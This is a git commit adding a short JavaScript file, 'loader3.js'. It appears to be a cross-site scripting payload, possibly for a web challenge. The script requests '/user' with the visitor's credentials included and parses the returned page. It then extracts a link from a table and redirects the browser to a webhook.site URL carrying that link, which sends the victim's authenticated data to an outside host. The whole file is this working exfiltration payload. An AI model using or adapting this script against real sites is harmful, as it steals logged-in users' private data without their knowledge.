77c4e52526f79c2dfe16ca32cb2e0ca99e160ff0
PecentZero <52845759+PecentZero@users.noreply.github.com>
2021-12-03 04:27:20 +0900

    Create loader3.js

---
+++ loader3.js
@@ -0,0 +1,17 @@
+fetch("/user", {
+  "headers": {
+    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+    "accept-language": "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
+    "cache-control": "max-age=0",
+    "upgrade-insecure-requests": "1"
+  },
+  "body": null,
+  "method": "GET",
+  "mode": "cors",
+  "credentials": "include"
+}).then(response => response.text())
+  .then(text => {
+    const parser = new DOMParser();
+    const htmlDocument = parser.parseFromString(text, "text/html");
+    location.href = "https://webhook.site/c9b2ee47-4690-40ad-9587-49d1e2d9ed05?"+(htmlDocument.documentElement.querySelector("#content > div > div > table > tbody > tr:nth-child(1) > td:nth-child(3) > a").href);
+  })
